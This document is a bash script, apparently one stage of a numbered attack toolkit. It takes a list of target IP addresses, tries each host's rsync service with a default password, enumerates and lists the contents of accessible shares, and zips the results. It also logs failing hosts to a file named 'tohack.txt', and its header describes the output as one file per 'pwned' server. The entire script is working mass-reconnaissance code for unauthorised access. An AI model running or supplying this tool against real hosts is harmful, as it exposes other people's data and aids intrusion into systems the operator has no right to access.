#!/bin/bash
#
# author  : TrustMe
# version : 1.0 
# usage : ./3-explore.sh targets_873.txt
# informations : 
#
# input  : targets_873.txt
# output : one file by server pwned, 1.1.1.1.txt 1.2.1.2.txt ... 

# ------------------ FUNCTIONS ------------- #

explore() {
RCMD=$(rsync --timeout=5 --password-file=pass.txt rsync://$RHOST)
share=$(echo $RCMD | cut -d" " -f1)
timeout 15 rsync --password-file=pass.txt rsync://$RHOST/ > rootfolders.txt
cat rootfolders.txt  |  cut -d ' ' -f 1  |  while read output
do
   ExploreRsync=$(rsync   --timeout=5 --password-file=pass.txt rsync://$RHOST/$output)
   ErrorExploreRsync="error"
   if [[ "$ErrorExploreRsync" == *"$ExploreRsync"* ]]; then
     echo "[ERROR] : rsync://$RHOST/$output"
     echo "$RHOST" >> tohack.txt
   else
     echo "EXPLORING $output"
     rsync  -av --list-only   --timeout=5 --password-file=pass.txt rsync://$RHOST/$output >> $RHOST.txt
     zip scandb.zip $RHOST.txt
     rm $RHOST.txt
   fi  
done
}
check_text_file() {
    if [[ $# -ne 1 ]]; then
        echo "[INFO] : Usage: check_text_file <filename>"
        return 1
    fi

    local filename="$1"

    if [[ ! -f "$filename" ]]; then
        echo "[ERROR]: File '$filename' does not exist."
	exit
    fi

    if [[ ! "$filename" =~ \.txt$ ]]; then
        echo "[ERROR] : File '$filename' is not a text file."
	exit
    fi
}
check_package_installed() {
    local package_name="$1"
    if ! dpkg -s "$package_name" >/dev/null 2>&1; then
        echo "[ERROR]: Package '$package_name' is not installed."
	apt install $package_name -y
    fi
}

# ------------------------ MAIN -------------------- #
touch pass.txt
chmod 600 pass.txt
echo "password" > pass.txt

FILE=$1
if [ -f "$FILE" ]; then
 cat $FILE |  while read output
 do
	 RHOST=$output
	 echo "[+] RHOST = $output"
	 explore $output
 done
else
 echo "[ERROR] - $FILE does not exist."
 exit 2
fi
rm rootfolders.txt
rm pass.txt

